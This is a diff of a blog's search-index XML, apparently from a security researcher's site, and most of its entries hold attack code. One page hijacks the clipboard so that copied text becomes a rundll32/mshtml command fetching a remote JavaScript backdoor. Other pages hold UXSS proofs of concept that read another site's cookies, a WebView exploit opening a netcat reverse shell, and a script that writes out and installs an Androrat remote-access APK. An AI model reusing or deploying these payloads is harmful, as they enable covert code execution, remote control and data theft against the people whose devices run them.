@@ -1074,19 +1074,9 @@
     <content type="text"><![CDATA[Copy the text below and run it in your terminal for totally not evil things to happen. echo "not evil" function copyTextToClipboard(text) { var textArea = document.createElement("textarea"); // // *** This styling is an extra step which is likely not required. *** // // Why is it here? To ensure: // 1. the element is able to have focus and selection. // 2. if element was to flash render it has minimal visual impact. // 3. less flakyness with selection and copying which **might** occur if // the textarea element is not visible. // // The likelihood is the element won't even render, not even a flash, // so some of these are just precautions. However in IE the element // is visible whilst the popup box asking the user for permission for // the web page to copy to the clipboard. // // Place in top-left corner of screen regardless of scroll position. textArea.style.position = 'fixed'; textArea.style.top = 0; textArea.style.left = 0; // Ensure it has a small width and height. Setting to 1px / 1em // doesn't work as this gives a negative w/h on some browsers. textArea.style.width = '2em'; textArea.style.height = '2em'; // We don't need padding, reducing the size if it does flash render. textArea.style.padding = 0; // Clean up any borders. textArea.style.border = 'none'; textArea.style.outline = 'none'; textArea.style.boxShadow = 'none'; // Avoid flash of white box if rendered for any reason. textArea.style.background = 'transparent'; textArea.value = text; document.body.appendChild(textArea); textArea.select(); try { var successful = document.execCommand('copy'); var msg = successful ? 'successful' : 'unsuccessful'; console.log('Copying text command was ' + msg); } catch (err) { console.log('Oops, unable to copy'); } document.body.removeChild(textArea); } document.addEventListener('keydown', function(event) { var ms = 800; var start = new Date().getTime(); var end = start; while(end < start + ms) { end = new Date().getTime(); } copyTextToClipboard('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")\ncls\necho "not evil"'); }); L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
-    <title><![CDATA[Archive]]></title>
-    <url>%2Farchive%2Findex.html</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
     <title><![CDATA[404 Not Found：该页无法显示]]></title>
     <url>%2F%2F404.html</url>
     <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[友情链接]]></title>
-    <url>%2Ffriends%2Findex.html</url>
-    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog 倾旋的博客 Ceil Profile]]></content>
   </entry>
   <entry>
     <title><![CDATA[Categories]]></title>
@@ -1094,13 +1084,23 @@
     <content type="text"></content>
   </entry>
   <entry>
-    <title><![CDATA[search]]></title>
-    <url>%2Fsearch%2Findex.html</url>
+    <title><![CDATA[Archive]]></title>
+    <url>%2Farchive%2Findex.html</url>
     <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[友情链接]]></title>
+    <url>%2Ffriends%2Findex.html</url>
+    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog 倾旋的博客 Ceil Profile]]></content>
   </entry>
   <entry>
     <title><![CDATA[Tags]]></title>
     <url>%2Ftags%2Findex.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[search]]></title>
+    <url>%2Fsearch%2Findex.html</url>
     <content type="text"></content>
   </entry>
   <entry>
@@ -1130,23 +1130,23 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
-    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
     <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
+    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
+    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
   </entry>
   <entry>
     <title></title>
